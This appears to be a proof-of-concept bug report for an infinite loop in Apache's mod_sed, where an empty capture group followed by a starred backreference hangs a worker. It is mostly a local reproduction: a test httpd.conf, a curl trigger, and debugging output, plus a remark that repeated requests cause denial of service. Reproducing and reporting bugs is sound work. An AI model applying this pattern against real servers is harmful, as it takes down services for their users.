# PoC 161 — Infinite Loop on Empty Starred Backreference (mod_sed)

A starred backreference to a zero-length capture group makes the bundled sed
matcher loop forever, hanging the worker that runs the sed filter.

## Setup

Module: `mod_sed`. No external dependencies.

`/tmp/161/htdocs/index.html`:

```html
ABC
```

`/tmp/161/httpd.conf`:

```apache
ServerRoot /tmp/161
Listen 127.0.0.1:8161
PidFile  /tmp/161/httpd.pid
ErrorLog /tmp/161/error.log
LoadModule mpm_event_module     modules/mod_mpm_event.so
LoadModule unixd_module         modules/mod_unixd.so
LoadModule authz_core_module    modules/mod_authz_core.so
LoadModule mime_module          modules/mod_mime.so
LoadModule sed_module           modules/mod_sed.so
DocumentRoot /tmp/161/htdocs
TypesConfig /dev/null
AddType text/html .html

<Location />
    SetOutputFilter Sed
    OutputSed "s/\(\)\1*/x/"
</Location>
```

The pattern `s/\(\)\1*/x/` contains:

- `\(\)` — a capturing group that matches the empty string, so
  `vars->braslist[0] == vars->braelist[0]` and `ct = 0`.
- `\1*` — a starred backreference. `sed_compile()` emits `CBACK | STAR`.

The `CBACK | STAR` arm of `_advance()` runs `while (ecmp(bbeg, lp, 0)) lp += 0;`
which never terminates.

## Trigger

```sh
httpd -f /tmp/161/httpd.conf
curl --max-time 5 http://127.0.0.1:8161/
```

`curl` exits with `28` (operation timed out). The worker that picked up the
request is now spinning at 100% CPU inside `_advance()`.

Also reproducible offline by linking `modules/filters/regexp.c` and `sed*.c`
into a small driver and calling `sed_step()` on `"ABC"` with the compiled
program for `s/\(\)\1*/x/`.

## Observed effect

- `curl` hangs and times out.
- One httpd worker pegs a CPU core indefinitely.
- `top -p $(pgrep -f httpd | head -n1)` shows 100% `%CPU`.
- `gdb -p <worker>` and `bt` shows the worker stuck in `_advance` /
  `sed_step`, with `ct == 0` in the `CBACK | STAR` block at
  `modules/filters/regexp.c:538`.
- Repeating the request from many clients exhausts MaxRequestWorkers,
  producing a denial of service for the whole vhost.

## Cleanup

```sh
kill $(cat /tmp/161/httpd.pid) 2>/dev/null
pkill -9 -f /tmp/161/httpd.conf
```
